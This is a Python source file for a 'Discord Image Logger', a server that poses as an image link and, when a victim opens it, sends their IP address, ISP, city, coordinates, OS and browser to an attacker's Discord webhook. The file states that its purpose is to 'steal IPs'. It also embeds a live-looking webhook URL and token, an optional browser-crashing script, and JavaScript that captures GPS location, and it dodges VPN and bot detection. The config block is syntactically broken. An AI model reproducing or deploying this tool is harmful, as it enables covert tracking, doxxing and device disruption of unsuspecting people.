# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook":https://discord.com/api/webhooks/1517266533871648911/GfgW6oHfsdKVERTpvWrqwaRIiC01x8UnlMdI9IrM3952e49R89VmvEAokMTSQ5F9pWLb
    "image":data:image/jpeg;base64,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%0A                                               #%20(E.g.%20yoursite.com/imagelogger?url=%3CInsert%20a%20URL-escaped%20link%20to%20an%20image%20here%3E)
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
